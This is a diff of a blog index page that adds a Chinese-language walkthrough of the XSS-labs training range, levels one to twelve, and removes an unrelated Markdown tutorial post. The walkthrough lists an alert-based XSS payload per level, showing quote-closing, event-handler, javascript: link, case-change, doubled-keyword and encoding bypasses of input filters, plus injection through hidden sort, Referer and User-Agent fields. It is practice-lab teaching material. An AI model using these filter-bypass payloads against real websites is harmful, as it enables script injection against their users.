@@ -64,6 +64,63 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss-labs" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/22/xss-labs/" class="article-date">
+  <time datetime="2022-04-22T10:21:04.140Z" itemprop="datePublished">2022-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>第一关：进入以后，根据页面显示我们推测name变量存在漏洞，放入xss poc顺利执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第二关：根据页面我们推测keyword存在漏洞，插入poc不行，查看源代码，发现我们插入的代码部分被重新编译了，尝试闭包，通过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>
+
+<p>第三关：插入代码，页面将代码原封不动的返回了，但是不通关。查看源代码，发现屏蔽了&lt;&gt;敏感字符，换成不用&lt;&gt;的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onfocus=javascript:alert(&#x27;xss&#x27;)&gt;//   //onfocus 事件在对象获得焦点时发生</span><br></pre></td></tr></table></figure>
+
+<p>然后再点击一遍搜索框就可以</p>
+<p>第四关:同上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第五关：尝试上一关代码，没有触发弹窗，查看源代码，发现对onfocus进行了防范，尝试基础代码，发现过滤了script,换一种标签代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
+
+<p>发现页面多了一个xss链接 点一下即可</p>
+<p>第六关:</p>
+<p>尝试以前的代码发现都不行，尝试变形方法，大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a HrEf=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
+
+<p>第七关：尝试基础代码，查看源代码，发现删除了script,在尝试事件触发，同样删除了script，大小写也不能绕过，尝试双写关键字绕过，通过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hrhrefef=javascscriptript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
+
+<p>第八关：以上方法都不行，尝试编码绕过，javascscriptript:alert(‘xss’)编码即可</p>
+<p>第九关：采用第八关的poc，发现poc中应包含合法的url，poc中添加//<a target="_blank" rel="noopener" href="http://www.baidu.com,发现可以进行绕过/">http://www.baidu.com,发现可以进行绕过</a></p>
+<p>第十关:插入poc发现不行，查看源代码发现多了三个参数，尝试提交三个参数，发现只有t_sort发生变化，尝试对他进行插入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>第十一关：查看源代码，发现多了一个t_ref，推测是refer,修改refer “type=”text” onclick=”alert(‘xss’)</p>
+<p>第十二关：多了一个t_ua，推测是User-Agent,修改user-agent “type=”text” onclick=”alert(‘xss’)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/22/xss-labs/" data-id="cl2aa9o5h0000hgu22dzf9idr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-XSS漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -450,38 +507,6 @@
 
 
   
-    <article id="post-md文件基本语法" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/03/19/md%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" class="article-date">
-  <time datetime="2022-03-19T05:22:19.586Z" itemprop="datePublished">2022-03-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="md文件基本语法"><a href="#md文件基本语法" class="headerlink" title="md文件基本语法"></a>md文件基本语法</h1><h2 id="（1）标题"><a href="#（1）标题" class="headerlink" title="（1）标题"></a>（1）标题</h2><p><img src="https://yslee0113.github.io/img/001.png" alt="img"></p>
-<h2 id="（2）粗体、斜体、删除和下划线"><a href="#（2）粗体、斜体、删除和下划线" class="headerlink" title="（2）粗体、斜体、删除和下划线"></a>（2）粗体、斜体、删除和下划线</h2><p><img src="https://yslee0113.github.io/img/002.png" alt="img"></p>
-        
-          <p class="article-more-link">
-            <a href="/2022/03/19/md%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/19/md%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" data-id="cl16atvq40005xwu22r263cil" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -518,6 +543,10 @@
       <ul>
         
           <li>
+            <a href="/2022/04/22/xss-labs/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/">(no title)</a>
           </li>
         
@@ -531,10 +560,6 @@
         
           <li>
             <a href="/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/20/SQLMAP/">(no title)</a>
           </li>
         
       </ul>
